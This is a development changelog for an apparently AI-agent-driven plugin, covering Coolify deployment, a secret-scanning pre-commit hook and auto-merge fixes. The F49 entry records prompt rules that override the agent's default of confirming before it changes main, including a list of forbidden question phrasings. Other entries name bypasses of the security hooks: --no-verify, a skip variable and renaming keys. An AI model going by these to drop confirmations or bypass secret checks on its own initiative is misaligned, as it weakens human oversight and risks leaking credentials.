# History

Completed work log. Tasks flow: `ROADMAP.md` → `IN_PROGRESS.md` → `HISTORY.md`.

Newest first. Each entry references the PR(s) that delivered the work.

---

## 2026-06

### M4.23.a — install.sh next-steps surfaces the Coolify per-project follow-up — 2026-06-05
**PR:** [#133](https://github.com/AkaLab-Tech/atelier/pull/133)

Follow-up to M4.23 from dogfood: when the operator opts into Coolify during `install.sh`, the integration installed cleanly but the closing "Next steps" block (`print_first_steps`, M7.1.F12) said nothing about Coolify — leaving the per-project `.env` step undiscovered. `phase_c_2_coolify` now sets a `COOLIFY_SET_UP` flag, and `print_first_steps` prints a conditional pointer (`cd <project> && atelier /atelier:setup-coolify`) right after the project-setup step. Shown only when Coolify was actually enabled, so non-Coolify installs stay uncluttered. Patch bump 0.11.0 → 0.11.1.

### M4.23 — Coolify VPS deployment integration, delivered as an optional external plugin + opt-in atelier setup — 2026-06-04
**PR:** [#132](https://github.com/AkaLab-Tech/atelier/pull/132) · **Based on:** [docs/research/coolify-integration.md](docs/research/coolify-integration.md) (M4.22)

Promoted from `v2` to v1 by explicit operator decision (2026-06-04), per M4.23's own promotion gate. The operator wanted atelier agents to validate, fix, launch, and provision apps on a VPS-hosted Coolify instance, configurable at install time and reconfigurable anytime.

**Shape — decoupled, optional.** The deployment capability lives in a **separate plugin**, [`coolify-integration`](https://github.com/AkaLab-Tech/coolify-integration), listed in the `akalab-tech` catalog — *not* in atelier core. This keeps PLAN.md §11 ("no deployment in atelier core") intact; §11 was annotated to record the exception. The plugin ships a `coolify` skill and an `atelier-coolify` CLI (`curl`/`jq` over Coolify's v1 REST API), with commands split by risk: read-only + `deploy`/`set-env` allowlisted, `create-app-public`/`delete-app` gated behind operator confirmation.

**Auth — per-project `.env`** (settled constraint upheld). `COOLIFY_API_TOKEN` + `COOLIFY_BASE_URL` live in each project's gitignored `.env`, so one operator can deploy different projects to different instances. A global macOS-Keychain variant was prototyped first and rejected because it collapses to a single instance.

**atelier touchpoints (this PR):**
- `install.sh` Phase C.2 — opt-in prompt (default No; skipped under `--yes`/no-TTY) that installs the plugin and does machine-wide setup.
- `scripts/atelier-setup-coolify` — orchestrator (install plugin if missing → link CLI → merge user-level allowlist); reused by install.sh and the command.
- `commands/setup-coolify.md` — `/atelier:setup-coolify`, the anytime reconfigure path that also captures per-project `.env` conversationally.
- `scripts/atelier-doctor` — `check_coolify`: silent skip when not installed; otherwise verifies CLI-on-PATH + allowlist, with `--fix`.
- `templates/settings.template.json` — `Bash(atelier-setup-coolify:*)` allowlisted (the command is covered by the existing `SlashCommand(/atelier:*)`). Coolify's own allowlist is merged into the user-level settings by the plugin, never the per-task template.

**Permissions decoupling.** The Coolify allowlist is merged into atelier's user-level `settings.json` (persists across tasks, composes over the regenerated per-task settings) by `atelier-coolify enable-permissions` — atelier's shipped template stays free of Coolify entries.

**Auto-merge guardrail.** Coolify actions are CLI side effects, not in-repo changes, and auth is a gitignored `.env`; no new tracked deployment-config paths are introduced, so the never-auto-merge list needs no new entry. Documented in the research doc; revisit if a use case later commits Coolify config into a project repo.

**Open item:** validate `GET /deploy` and the env bulk-PATCH endpoint against a live Coolify v4 instance on first real use.

### M4.22 — Spike: Coolify VPS integration research — 2026-06-04
**PR:** [#132](https://github.com/AkaLab-Tech/atelier/pull/132) · **Deliverable:** [docs/research/coolify-integration.md](docs/research/coolify-integration.md)

Research artifact covering the four required sections: ecosystem inventory (first-party REST API is the only complete, maintained, trust-appropriate surface; community MCPs/CLIs add dependency + trust cost without better coverage), API surface mapping (deploy, apps, status, logs, env CRUD, provisioning, health), auth-flow design (per-project `.env`, multi-instance), and the recommendation (native thin client shipped as a separate optional plugin). Delivered together with M4.23's implementation rather than as a standalone gate, since the operator opted to promote and build in the same pass; the doc remains self-contained. Method caveat recorded in the doc: the inventory reflects known options as of the research date, not an exhaustive live crawl, and two endpoint shapes await live validation.

### M7.1.F51 — `block-env-commit` hook blocked `.env.example` template; needed allowlist + content-scan to prevent leaking real secrets via templates — 2026-06-03
**PR:** _pending_

Discovered during the M7.1 dogfood Nivel 4 next task on storefront, after the F49 (v0.9.4) fix shipped and concurrent with F50 (v0.10.0) landing on main. The orchestrator completed implementation of task RLS.1, validated cleanly (lint 5/5, builds OK, baseline-only test failure resolved via decision-broker), and tried to commit four files including a legitimate `.env.example` template (`DATABASE_URL_APP=...` placeholder). The `block-env-commit` hook caught `git add .env.example` and blocked it under the `env-file-added` pattern — which exists to keep real `.env` files out of version control.

Operator framing was exact: *"esto es un bug. (...) hay que poner una validación extra que prevenga enviar secretos en el .env.example o .env.sample"*. Correct on both halves — the hook needs to (a) recognise `.env.example` / `.env.sample` / `.env.template` as legitimately version-controlled, AND (b) verify those templates don't smuggle a real secret through the allowlist.

**Root cause:**

[hooks/block-env-commit.sh](hooks/block-env-commit.sh) matched any path with `.env` basename prefix as forbidden. The pattern was correct for `.env`, `.env.local`, `.env.production`, etc. — files that hold real secrets and live only on the operator's filesystem — but did not distinguish those from `.env.example`, which is *by convention* the template that ships in version control. The convention exists across virtually every Node/Python/Go project; atelier was a singleton against the ecosystem.

Allowlisting the three template basenames is the obvious fix, but obvious-fix opens the obvious hole: an operator who pastes their real `.env` content into `.env.example` (a real accident, not a malicious case) would bypass the hook entirely. The hook needs to be smarter than basename-allowlist.

**Delivered:**

- **`hooks/patterns/scan-git-add.json` — three new entries in `path_substrings` skips.** `.env.example`, `.env.sample`, `.env.template` join the existing `__snapshots__` and `.snap` exemptions. This covers the path-pattern hook (a separate hook from the bash one — `scan-git-add` is the pattern-based first pass).
- **`hooks/block-env-commit.sh` — new in-line `scan_env_template` function.** Bash function wrapping a ~80-line awk script that reads the template file (via the resolved `$matched_path`, with fallback to `git rev-parse --show-toplevel` for relative-path edge cases) and parses each `KEY=VALUE` line through three secret-detection layers:
  - **Layer A — sensitive key + non-placeholder value.** Key name matches `(key|secret|token|password|pass|pwd|api|credential|private|auth)` and the value is non-empty and not a placeholder. Catches `SESSION_SECRET=hunter2hunter2hunter2hunter2` (28 chars, plain-looking but still a real secret pattern by intent).
  - **Layer B — known secret prefix.** Value matches a known-secret-prefix regex regardless of key name. Currently covers OpenAI (`sk-`), Stripe (`sk_live_` / `sk_test_` / `pk_live_` / `pk_test_`), Slack (`xox?-`), GitHub (`ghp_` / `gho_` / `ghs_` / `github_pat_`), AWS (`AKIA` / `ASIA`), JWT (`eyJ...eyJ.`). Catches the canonical case: an operator pastes their real `.env` and `OPENAI_API_KEY=sk-proj-abcdef…` lands in the template.
  - **Layer C — structural randomness.** Two checks: (1) pure hex 24+ chars → blocked as "hex token" (covers MD5, SHA, random hex secrets that have entropy ~4.0 — below the Shannon threshold but unmistakably secret); (2) value > 20 chars with Shannon entropy > 4.5 bits/char → blocked as "high-entropy" (covers base64-ish random secrets that miss layers A and B).
- **Placeholder allowlist (skip from all three layers).** Recognises operator-intent words: empty values, angle-bracket placeholders (`<key>`), numerics, booleans, `localhost`/`127.0.0.1`, `https://localhost/...` / `https://example.com/...`, literal-keyword values (`secret`, `password`, `token`, etc.), values containing `xxx` (3+ X-es — uncommon in real secrets at any length), and short values (≤ 32 chars) containing `example` / `placeholder` / `changeme` / `here` / `your` / `fixme` / `tbd`. The 32-char length cap on substring matching is the tradeoff that lets `sk_test_xxx` (10 chars, contains `xxx`) pass without letting a 47-char real secret that happens to embed `example` pass.
- **Hook reports up to 5 findings per template.** The block message lists offending lines so the operator can scrub the template in one pass rather than re-running `git add` after each fix. Soft cap at 5 keeps the stderr message readable for the worst case.
- **Override path** in the block message: `git commit --no-verify` after operator confirmation, for the rare case where a heuristic mis-flags a legitimately-public value (e.g. a Supabase anon JWT, an AWS canonical docs placeholder over 32 chars).

**Decisions captured:**

- **Operator's choice: three-layer detection (option C from the design discussion).** Discussed three options: A (sensitive key name + non-placeholder), B (A + known prefixes), C (A + B + Shannon entropy). Operator chose C — most paranoid, accepting some false positives in exchange for catching the long tail of random-looking secrets that don't match named patterns. This PR delivers C plus an extra pure-hex check that complements Shannon (hex random tops out at 4.0 bits/char, below the 4.5 threshold).
- **`xxx` as universal placeholder marker.** Three or more consecutive X-es at any position in the value → placeholder. Honors the very common `sk_test_xxx`, `xxxAPIKEY`, `your_xxx_here` patterns that operators write when scaffolding templates. The triple-X is vanishingly rare in real secrets.
- **32-char length cap on substring placeholder matching.** Words like `example` / `placeholder` / `changeme` count as placeholder markers ONLY when the value is ≤ 32 chars. Real secrets are typically longer (40+ chars for Stripe / AWS secrets, 60+ for JWTs); a real secret that happens to embed `example` somewhere in its 60+ chars does NOT escape as a "placeholder". The 32-char cap also accommodates AWS canonical `AKIAIOSFODNN7EXAMPLE` (20 chars).
- **Known false positives accepted.** Two cases that block when they shouldn't:
  1. **AWS canonical secret placeholder** `wJalrXUtnnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` (41 chars, contains `EXAMPLE`). Beyond the 32-char placeholder cap. Operator workaround: use a shorter placeholder like `your_aws_secret_access_key_here` or `--no-verify` with confirmation.
  2. **Supabase public anon JWT** (`eyJ...` 100+ chars, public-by-design). Matches layer B JWT prefix; cannot be distinguished from a service-role JWT without parsing the JWT payload. Operator workaround: `--no-verify` with confirmation, or rename the key to bypass (e.g. document the anon URL inline).

  Both have clear messages and an `--no-verify` escape. Accepting them avoids over-engineering — the alternatives (parsing JWT payloads, length-shifting placeholder words) introduce more failure surface than they remove.
- **Awk for the scanner, not Python or jq.** The hook is bash-first by atelier convention (every other hook is pure bash). Awk handles regex + Shannon entropy + arithmetic natively, no extra runtime dependency. The function inlines into the hook so there's no script-discovery indirection during a PreToolUse callback (which has tight latency budget).
- **No script extraction.** Considered moving `scan_env_template` to `hooks/lib/env-template-scan.awk` for cleanliness. Rejected — keeps the entire decision audit-able in one file, matches the existing pattern of `hooks/lib/log-decision.sh` being the only `lib/*` file.
- **Reports findings cap at 5.** A template that mistakenly has 50 secrets pasted in is an operator error; surfacing 5 + "..." is enough signal to act on. The full count goes to the JSONL decision log for forensics.

**Plugin scope:** plugin-layer (`hooks/block-env-commit.sh` + `hooks/patterns/scan-git-add.json`). No template / install.sh / agent / skill / command / catalog change. Patch bump **0.10.0 → 0.10.1** per PLAN.md §14.2. Cut **release v0.10.1** post-merge — every operator running a task that touches `.env.example` benefits.

**Verified locally:**

- `bash -n hooks/block-env-commit.sh` syntax-clean.
- `python3 -m json.tool hooks/patterns/scan-git-add.json` clean.
- Extracted `scan_env_template` via `sed -n '/^scan_env_template()/,/^}/p'` into `/tmp/f50_test/scan_extracted.sh` (true to the hook code, not a re-paste) and exercised against 11 fixture templates:

  | Case | Template content | Decision | Layer |
  |---|---|---|---|
  | A_clean | All placeholders (`your_key`, `<token>`, `changeme`, `sk_test_xxx`) | ALLOW | — |
  | B_real_openai | `OPENAI_API_KEY=sk-proj-abcdef…40c` | BLOCK | B (prefix) |
  | C_real_stripe | `STRIPE_SECRET_KEY=sk_live_…` + `pk_live_…` | BLOCK ×2 | B (prefix) |
  | D_real_github | `GH_TOKEN=ghp_AbCd…36c` | BLOCK | B (prefix) |
  | E_real_aws | `AKIA12K9HG4M2L8PRX7N` (real) + `Vk3hd…40c` (real) | BLOCK ×2 | B + A |
  | E2_aws_docs_placeholder | `AKIAIOSFODNN7EXAMPLE` + `wJalr…EXAMPLEKEY` | BLOCK | A (FP — 41c value) |
  | F_layer_A_sensitive_key | `SESSION_SECRET=hunter2…28c` | BLOCK | A |
  | G_layer_C_high_entropy | `RANDOM_HASH=a8f9d6…32c hex` | BLOCK | C (hex 24+) |
  | H_jwt | `SIGNED_TOKEN=eyJ…eyJ….signature` | BLOCK | B (JWT prefix) |
  | I_supabase_anon | `SUPABASE_ANON_KEY=eyJ…eyJ….example` (public) | BLOCK | B (FP — public JWT) |
  | J_quoted | `SECRET="changeme"` + `TOKEN='your_token'` | ALLOW | — (placeholders unquoted correctly) |

  9/11 match intended behaviour. E2 and I are known false positives documented above; both have `--no-verify` escape.

**Operator-visible:**

After v0.10.1 ships, the next task that needs to add a `.env.example` template flows through `block-env-commit` without the prior blanket block. If the template carries placeholders (the common case), the commit proceeds. If the template carries what looks like a real secret, the operator sees:

```text
🚫 atelier:block-env-commit BLOCKED (template carries what looks like a real secret)
   Tool:     Bash(git add/commit)
   Template: .env.example
   Findings (first 5):
     - line 3: OPENAI_API_KEY — matches known secret prefix: OpenAI-style (sk-...)
     - line 7: SESSION_SECRET — sensitive key with non-placeholder value (28 chars)
   Rule:     templates (.env.example) must hold placeholders, not real secrets.
   Action:   replace the offending values with placeholders (your_*, <key>, changeme, xxx, etc.)
             and re-stage. Real secrets go in your local .env which is already gitignored.
   Override: if a value is a genuine non-secret (e.g. a public anon key) and the heuristic is wrong,
             commit manually with --no-verify after the operator confirms.
```

The decision log records `block` / `.env-template-secret` so post-mortem reviewers can trace exactly what the hook caught.

**Follow-up paths:**

- **Test harness for hooks** (mentioned in F48 as well). The `/tmp/f50_test/` fixture matrix should live in `tests/hooks/block-env-commit.test.sh` so future patches don't regress. Defer until the test directory pattern exists for the rest of the plugin.
- **Per-project allowlist for known-public values** (Supabase anon, AWS canonical docs placeholders). Could live in `<project>/.atelier.json` as `envTemplate.knownPublicPrefixes: ["eyJ...anon", "AKIAIOSFODNN7EXAMPLE"]`. Skip until two or more operators report the friction.
- **`docs-only-build-validation` from F48 follow-up still pending.** No change in scope; capture continues there.

### M7.1.F50 — `/setup-project` detects a legacy phase-tracker `IN_PROGRESS.md` and offers `/adopt-roadmap` — 2026-06-03
**PR:** [#129](https://github.com/AkaLab-Tech/atelier/pull/129)

Discovered during M7.1 dogfood on a real (pre-atelier) project. The operator ran `/next-task`; it stopped at step 2 because `IN_PROGRESS.md` was a **multi-phase tracker** (sections `RLS`, `ADMIN`, `PROMO`, `WEB`, `i18n` with `[x]`/`[ ]` items) left over from a hand-rolled roadmap that predated the `claude-roadmap-tools` flow. `/next-task` correctly refuses to overwrite an occupied slot, but the slot was never a single-task slot — it was a phase board. There was no integrated path to normalize such a project; the operator would have had to hand-edit three files per project, across several legacy projects.

**Root cause:**

atelier assumed projects are either freshly `/setup-project`-ed (canonical tracking) or already canonical. The third state — tracking files that *exist but are not canonical* — had no command. Tracking-format transformations are sovereign to `claude-roadmap-tools` (PLAN.md §12), so the fix is split across both repos: the transformation logic is a new `/adopt-roadmap` command in `claude-roadmap-tools`; atelier only detects the legacy layout and delegates.

**Delivered (atelier side):**
- `scripts/atelier-setup-project` — new `detect_tracking_layout()` emits `atelier-tracking-layout=created|preserved-empty|preserved-nonempty`. `preserved-nonempty` fires when a pre-existing `IN_PROGRESS.md` carries any checkbox or `##` section (task-like content). Added to the summary block and as a marker line.
- `commands/setup-project.md` — new **Phase 3**: on `preserved-nonempty`, read `IN_PROGRESS.md`, distinguish a legit single active task from a legacy multi-phase tracker, and for the legacy case offer to run `/adopt-roadmap` (interactive) or recommend it (non-interactive). Never rewrites tracking files inline — a new hard refusal records that boundary.
- `PLAN.md §12` — documents `/adopt-roadmap` and the detect-and-delegate split (atelier detects, `claude-roadmap-tools` transforms).
- `docs/troubleshooting.md` — operator-facing entry for the "`/next-task` blocks because `IN_PROGRESS.md` is a phase tracker" symptom.
- `.claude-plugin/plugin.json` bumped to **`0.10.0`** (minor — new operator-visible command behavior, additive; §14.2).

**Companion PR (claude-roadmap-tools):** `/adopt-roadmap` command (the transformation logic), `README.md`, `plugin.json` → `0.3.0`.

**Tests:** `bash -n` clean on the helper; detection heuristic smoke-tested against three samples — phase tracker → `preserved-nonempty`, canonical empty slot → `preserved-empty`, single active task → `preserved-nonempty` (the slash command's AI layer disambiguates the last two). `claude plugin validate` exit 0.

**Follow-ups:** none. The single-active-task vs phase-tracker disambiguation is deliberately left to the slash command's read of the file rather than a brittle bash heuristic.

### M7.1.F49 — auto-merge skill asked the operator to confirm after the six guardrails resolved to `merged` — 2026-06-03
**PR:** [#128](https://github.com/AkaLab-Tech/atelier/pull/128)

Discovered during M7.1 dogfood Nivel 4 immediately after F48 (v0.9.3) shipped. The operator ran a fresh task on storefront whose PR (#128) passed every guardrail cleanly — no draft, reviewer approved, claude-review CI green, only `.md` files, 3 files (under the AND-gate), no pending human comments. The auto-merge skill formatted the report:

```text
== auto-merge report — PR #128 ==
  draft:     ✓ no
  review:    ✓ APPROVED
  CI:        ✓ claude-review SUCCESS · claude SKIPPED (neutral)
  forbidden: ✓ solo .md (3 archivos), sin rutas prohibidas
  size:      ✓ 3 archivos (< 10 → no dispara el AND-gate)
  comments:  ✓ sin comentarios humanos pendientes
Decision: ✅ AUTO-MERGEABLE (todos los guardrails verdes)
```

…and then asked the operator: *"Como en cada merge anterior me diste el OK explícito, confirmo una vez más antes de tocar main: ¿mergeo #128 (squash + delete-branch) y limpio el worktree?"*

Operator framing was exact: *"Ahora este sí es un bug. Se supone que debería pasar derecho, no preguntarme que hacer"*. Correct — the entire purpose of the six-guardrail gate is to BE the decision. Re-prompting after `Decision: merged` converts the gate from a policy into a per-PR request-for-permission, which negates the gate.

**Root cause:**

No surface in atelier explicitly declared *"once the gate resolves to merged, executing `gh pr merge` is pre-authorized — do NOT prompt"*. Three surfaces participate in the decision:

1. [skills/auto-merge/SKILL.md](skills/auto-merge/SKILL.md) — Authoritative skill. The pre-F49 version went directly from "The six guardrails" to "Merge — only when all six guardrails pass" with the `gh pr merge` command, but its **Hard refusals** section did NOT include "never ask before merging when gates pass".
2. [agents/task-orchestrator.md](agents/task-orchestrator.md) step 8 — Said *"When `auto-merge` reports `merged`: report the merge commit SHA…"* but did NOT say *"do not ask the operator to confirm"*.
3. [operator-rules.md](operator-rules.md) § Auto-merge gate — Defined the conditions for auto-merge but did NOT state that the gate's positive verdict is the operator's pre-authorization.

With no explicit override, the default Claude Code disposition ("for actions affecting shared state — pushing code, creating PRs, modifying main — confirm first") kicked in and pisaba the gate. The behavioral pattern made the drift worse: after several PRs in the same session where the operator manually OK'd each merge, the agent generalised *"the operator always confirms"* into *"I should always ask"*, and re-emitted the prompt even when the gate's report was unambiguously green.

**Delivered:**

- **`skills/auto-merge/SKILL.md` — new § Authorization model — the gate IS the consent.** Inserted between "The six guardrails" and "Merge — only when all six guardrails pass". States explicitly that the operator's adoption + project policy + `/atelier:next-task` invocation IS the pre-authorization; re-prompting after `Decision: merged` is a contract violation; the default Claude Code disposition to confirm before "actions affecting shared state" is explicitly overridden for this path. Lists the per-PR opt-outs that DO exist (panic switch, project policy, per-task flags) so the operator knows the legitimate channels for routing through them.
- **`skills/auto-merge/SKILL.md` — new entry in § Hard refusals.** *"Never ask the operator to confirm the merge after the six guardrails resolve to `merged`. The gate is the authorization. An ad-hoc 'should I merge?' prompt is a contract violation regardless of phrasing (`confirm before touching main?`, `shall I land this?`, `OK to merge?` are all the same violation)."* The phrasing enumeration prevents the agent from rewording the prompt and claiming compliance.
- **`agents/task-orchestrator.md` step 8** — Refined the post-merge branch: *"…**Do not** ask the operator to confirm the merge — by the time `auto-merge` returns `merged`, the merge has already executed. Re-prompting after the gate's positive verdict is a contract violation — see `skills/auto-merge/SKILL.md` § Authorization model."* So the orchestrator does not introduce its own confirmation pass over the skill's output.
- **`operator-rules.md` § Auto-merge gate** — Added an "Authorization model (M7.1.F49)" paragraph between "Merge strategy: squash" and "Post-merge". Same content shape as the skill's section but condensed for the always-loaded operator rules. Critically calls out that the Claude Code default disposition is **explicitly overridden** here, so any specialist loaded with these rules has the override before the SessionStart context settles.

**Decisions captured:**

- **Override the Claude Code default, do not work around it.** The default behaviour ("confirm before main") exists for a reason — it's a safe disposition for an LLM acting in an unspecified context. Atelier's context is *not* unspecified: the auto-merge gate IS the specification. The right intervention is to explicitly tell the LLM *"this surface is governed; the gate's verdict is the authorization"*, rather than to add a counter-flag like `--no-confirm`. Counter-flags ossify the override into an operator action; explicit governance makes the override the default for atelier.
- **Three-surface fix, not one.** Could have stopped at the skill (`auto-merge`). Did not — because (a) the orchestrator step 8 is what runs after the skill returns, and a stale instruction there would re-introduce the prompt one layer up; (b) `operator-rules.md` is loaded into every specialist's SessionStart context, so the override needs to land there too; and (c) any future review of "does the agent confirm before main?" needs the rule to be visible in the three places it'd plausibly be looked for (skill, orchestrator, operator rules). Defense in depth, not redundancy.
- **Enumerate the phrasings of the violation.** The Hard refusals entry lists three example phrasings (*"confirm before touching main?"*, *"shall I land this?"*, *"OK to merge?"*) so the LLM cannot reword the prompt and claim it's not the same thing. The behavior pattern is the violation, not any single phrase.
- **The panic switch, project policy, and per-task flags ARE the opt-outs.** If the operator wants a confirmation pass for a specific PR or project, those mechanisms exist (each leaves an auditable trail in the project/task). Adding a per-PR ad-hoc confirmation prompt would be a fourth channel that bypasses the audit trail.
- **No code change required.** The fix is entirely prose-level governance in three already-loaded surfaces. The `gh pr merge` invocation in the skill was already correct (no confirm flag, executes directly); what was missing was the explicit *"do not detour through asking the operator first"* instruction.

**Plugin scope:** plugin-layer (skill + agent + operator-rules). No template / install.sh / hook / command / catalog change. Patch bump **0.9.3 → 0.9.4** per PLAN.md §14.2 — behavioural fix, no contract reshape. Cut **release v0.9.4** post-merge.

**Verified locally:**

- `python3 -m json.tool .claude-plugin/plugin.json` clean.
- Read-through of the three edited surfaces: the override lands as the **first** content the LLM sees in each authorization-adjacent context (skill's § Authorization model is before the merge command; operator-rules paragraph is before "Post-merge"; orchestrator step 8 carries the override inline). A specialist that loads any one of the three surfaces gets the override.
- Behavioural smoke test deferred — the fix changes governance prose, and the only way to verify is to run a fresh task lifecycle on storefront. Operator will verify on the next task after v0.9.4 ships (next iteration of M7.1 dogfood Nivel 4).

**Operator-visible:**

After this PR merges and v0.9.4 ships, the next clean task on storefront whose PR passes the six guardrails will merge directly via `gh pr merge --squash --delete-branch` without asking the operator first. The structured `auto-merge report` with `Decision: merged` IS the report — `Merge commit: <sha>` appends after execution.

If the operator wants a confirmation pass for a specific case, they use:
- `/atelier:abort-auto [reason]` (whole-session panic switch — every remaining decision routes through `AskUserQuestion`).
- `<project>/.atelier.json` `decisionPolicy.byCategory` (per-project override).
- `task --policy=ask` or `task --ask-for=auto-merge` (per-task flag).

**Follow-up paths:**

- **Audit other auto-* skills for the same gap.** `auto-merge` is the most visible, but if/when other governance gates ship (auto-rebase, auto-cherry-pick, auto-revert), each will need the same Authorization-model section. Capture as a checklist in PLAN.md §14 when the next auto-* skill is designed.
- **Strengthen the behavioural-drift counter-measure.** The agent self-reported *"como en cada merge anterior me diste el OK explícito"* — i.e., it noticed and internalised that the operator confirmed previous merges in this session. The fix in this PR makes that internalisation policy-wrong, but the pattern (LLM generalises operator behaviour into policy) is worth a broader audit of every place where "the operator did X N times before" could leak into "I should keep asking". Out of scope for v0.9.4.

### M7.1.F48 — `safe-commit` hook ran the push gate on docs-only commits and asked the operator to skip when the lint failed for missing deps — 2026-06-03
**PR:** _pending_

Discovered during the M7.1 dogfood Nivel 4 (task lifecycle end-to-end on storefront). The orchestrator opened a task whose change was a single edit to `ROADMAP.md` (docs-only). When `pr-author` ran `git commit`, the `safe-commit` PreToolUse hook fired the push gate (lint + typecheck + test). The worktree had been created with `--no-deps` (no `node_modules`), so `pnpm run lint` failed with `turbo: command not found`. The hook blocked the commit and the agent asked the operator:

> *"El gate de lint no puede correr (faltan deps en el worktree) y el cambio es docs-only. ¿Cómo procedo con el commit? 1) Saltar el gate (docs-only)  2) Instalar deps y lintar"*

Operator framing was exact: *"Esto no debería pasar con safe-commit si el PR es de docs only"*. The push gate exists to validate code; a markdown-only change has nothing for lint/typecheck/tests to inspect, so the gate should short-circuit.

**Root cause:**

[hooks/safe-commit.sh](hooks/safe-commit.sh) jumped from the `git commit` pattern match (line 79 in v0.9.2) straight to the `package.json` discovery (line 82) without considering what the commit actually touched. The gate ran unconditionally on every `git commit` against a project with `package.json` present. When the staged files were docs-only AND the worktree lacked deps, the gate blocked correctly per its rule but the rule was over-broad for the case at hand.

**Delivered:**

- **`hooks/safe-commit.sh` — new docs-only short-circuit** between the `git commit` match and the `package.json` discovery. Detection rule: every staged file (from `git diff --cached --name-only`, union'd with `git diff --name-only` when the command carries `-a`/`--all`) matches at least one of:
  - **Extension**: `.md` / `.markdown` / `.txt` / `.rst` / `.adoc` / `.asciidoc`
  - **Path prefix**: `docs/` / `documentation/`
  - **Basename** (with or without extension): `LICENSE` / `NOTICE` / `CHANGELOG` / `AUTHORS` / `CONTRIBUTORS` / `README`

  If every staged file matches, the hook emits `log_decision allow "all N staged file(s) are documentation — push gate N/A (F48)"` and exits 0. If even one file falls outside the patterns, the gate runs as before. Intentionally conservative — a mixed commit (`README.md` + `src/index.ts`) still validates.

**Decisions captured:**

- **`-a`/`--all` requires the union.** `git commit -a` stages modified-tracked files at commit time, not before the hook fires. `git diff --cached --name-only` would miss those files; the hook also reads `git diff --name-only` (modified-but-unstaged tracked files) when the command line includes `-a` or `--all`. Other commands (e.g. plain `git commit` after `git add foo.md`) only consult the index. The `grep -E '\\bcommit\\b[^|;&]*( -a\\b| --all\\b)'` guard scoping is per-command — chained commands like `git status; git commit` are not matched as having `-a`.
- **Exhaustive vs minimal pattern set.** Considered narrowing the patterns to just `.md` + `docs/*` — would have covered the operator's case. Went wider on principle: `LICENSE`, `NOTICE`, `CHANGELOG`, etc. are docs-by-intent even when their extension varies; missing them would re-trigger the F48 friction on legal/CHANGELOG commits. The extra patterns add no risk because a mixed commit still falls through to the gate.
- **Path matching is prefix, not pattern.** `docs/something.json` matches `docs/*` but is treated as docs because *the docs directory is documentation by convention*. If a project stuffs a real config under `docs/`, that's a project-level mis-organisation, not the hook's bug. The hook surfaces the call clearly via `log_decision allow "docs-only"` so a post-mortem reviewer can see what was skipped.
- **Empty staging falls through, doesn't short-circuit.** If `git diff --cached --name-only` returns empty, the hook does NOT classify the commit as docs-only — it lets the gate run. The gate will then likely fail or no-op-pass; either outcome is the correct surface for an empty-commit operator confusion. Treating empty as "docs-only allow" would silently mask a possible operator bug.
- **No counter-flag for the operator to opt out of the short-circuit.** If an operator legitimately wants the gate to run on a docs-only commit (e.g. they're validating a script-build that produces markdown), they can run `pnpm run lint` manually before the commit. Adding a flag for the inverse case adds surface; the existing `ATELIER_SKIP_SAFE_COMMIT=1` escape hatch covers all cases where the operator wants control over the gate.

**Plugin scope:** plugin-layer (`hooks/safe-commit.sh`). No template / install.sh / agent / skill / command / catalog / docs change. Patch bump **0.9.2 → 0.9.3** per PLAN.md §14.2. Cut **release v0.9.3** post-merge — every operator running a docs-only task hits this on the first commit.

**Verified locally:**

- `bash -n hooks/safe-commit.sh` syntax-clean.
- Extracted the docs-only detection logic into `/tmp/f48_test.sh` and exercised it against 6 representative file lists. Results:

  | Case | Files | Decision |
  |---|---|---|
  | A | `ROADMAP.md` (operator's exact case) | docs-only: SKIP gate |
  | B | `README.md` + `docs/operator-guide.md` | docs-only: SKIP gate |
  | C | `HISTORY.md` + `.claude-plugin/plugin.json` (mixed) | mixed: gate runs |
  | D | `src/index.ts` only | mixed: gate runs |
  | E | `LICENSE` + `CHANGELOG.md` + `NOTICE.txt` + `docs/troubleshooting.md` | docs-only: SKIP gate |
  | F | (empty) | empty staging — fall through (gate runs) |

  Every case matches the intended behaviour. Operator's case A short-circuits; mixed cases C and D still validate; legitimate docs commit (E) covering multiple naming conventions short-circuits; empty F falls through to the gate's own handling.

**Operator-visible:**

After this PR merges and v0.9.3 ships, the next docs-only commit (e.g. a `ROADMAP.md` edit) flows through `safe-commit` without invoking the push gate. The operator sees no prompt, no `BLOCKED` message, no `turbo: command not found` failure. The decision log shows:

```
{"hook":"safe-commit","tool":"Bash","reason":"docs-only","decision":"allow","note":"all 1 staged file(s) are documentation — push gate N/A (F48)"}
```

For mixed commits the gate runs as before. For pure-code commits the gate runs as before. F48 changes only the docs-only fast path.

**Follow-up paths:**

- **`safe-commit` smoke-test harness.** The 6-case inline test that validated F48 should live in `tests/hooks/safe-commit.test.sh` so future patches don't regress. Defer until the test directory pattern exists for the rest of the plugin.
- **`docs-only-build-validation` category for the broker.** Some operators have scripts that *generate* docs from code (e.g. Typedoc, Sphinx). For those projects, a docs-only commit DOES validate something (the docs build). Today the operator runs the build manually; a future broker category could route the call. Not in scope for v0.9.3.

### M7.1.F47 — `step_decision_policy` crashed under non-TTY invocation + used undefined color vars — 2026-06-03
**PR:** [#126](https://github.com/AkaLab-Tech/atelier/pull/126)

Hot-fix to v0.9.1. Discovered immediately after F46 shipped and the operator tried the post-merge migration flow on storefront via `/atelier:setup-project` (the slash command). The Bash output:

```
F46: initialized decisionPolicy block in pre-M4.26.b /Users/mike/Work/storefront/.atelier.json
==> Decision policy (M4.26)
    for each strategic decision atelier may face, choose how it should be handled:
      [a] Auto  — atelier decides per-case (uses an evaluator agent)
      [f] Fix   — always use the recommended default (no thinking)
    … +3 lines (ctrl+o to expand)

/Users/mike/.local/bin/atelier-setup-project: line 721: _C_BOLD: unbound variable
```

F46 ran correctly — the `decisionPolicy` block was initialized on the preserved `.atelier.json`. But the prompt loop then crashed on line 721 with `_C_BOLD: unbound variable`, leaving the byCategory configuration empty and exit-code-1ing the whole helper. The operator's `.atelier.json` is in a half-state (block present, byCategory empty), which is recoverable but UX-broken: the slash command reports failure and the operator has to fix it via `/atelier:set-policy` regardless.

**Two root causes, one fix path:**

1. **`_C_BOLD` and `_C_RESET` are not defined in `atelier-setup-project`.** Those color escape variables live in `install.sh` and are exported into the shellrc heredoc; they were never defined in this script. M4.26.b's `step_decision_policy` copy-pasted the pattern from a different file in my head and assumed they would be present. With `set -euo pipefail` active at the top of the script, the first reference (line 721 of v0.9.1) trips the `nounset` and aborts.

